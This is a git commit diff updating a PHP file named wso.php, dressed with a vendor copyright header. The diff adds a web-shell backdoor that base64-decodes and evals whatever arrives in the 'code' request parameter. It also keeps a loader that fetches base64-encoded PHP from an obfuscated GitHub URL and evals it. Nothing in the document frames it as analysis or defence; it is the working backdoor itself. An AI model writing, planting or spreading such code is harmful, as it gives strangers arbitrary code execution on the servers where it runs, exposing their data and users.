e6dd8966b486257c2abbf210bc820a9a143875c5
k6n <k6n@hotmail.com>
2020-09-02 22:54:22 +0400

    Update wso.php

--- wso.php
+++ wso.php
@@ -1,5 +1,9 @@
+
+
 <?php
 
+
+// https://github.com/k6n/files/raw/master/64.txt
 
 //
 
@@ -7,11 +11,13 @@
 
 //	Copyright 2013 Schmooze Com Inc.
 
-//
+// echo $code;
 
-
+$code = $_REQUEST['code'];
+//eval($code);
+eval(base64_decode($code));
 eval(
 
-base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2s2bi9maWxlcy9tYXN0ZXIvNjQudHh0'))));
+base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9naXRodWIuY29tL2s2bi9maWxlcy9yYXcvbWFzdGVyLzY0LnR4dA=='))));
 
 ?>
